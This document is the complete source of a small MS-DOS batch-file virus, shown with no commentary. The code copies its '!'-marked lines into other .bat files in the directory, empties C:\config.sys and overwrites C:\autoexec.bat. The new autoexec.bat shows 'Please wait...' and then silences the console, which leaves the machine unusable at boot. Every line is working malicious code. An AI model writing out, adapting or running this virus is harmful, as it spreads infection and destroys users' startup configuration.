@ctty nul%!%
append %path%%!%
if %1d==!d goto !c
if not %1d==d goto !d
:!s
for %%a in (*.bat) do call %0 ! %%a
goto !e
:!d
type nul>c:\config.sys%!%
echo @echo Please wait...>c:\autoexec.bat%!%
echo @ctty nul>>c:\autoexec.bat%!%
goto !s
:!c
find/c "!" %2
if not errorlevel 1 goto !e
find "!" %0.bat|find/v/i "%0">>%2
:!e
if not %1d==!d ctty con
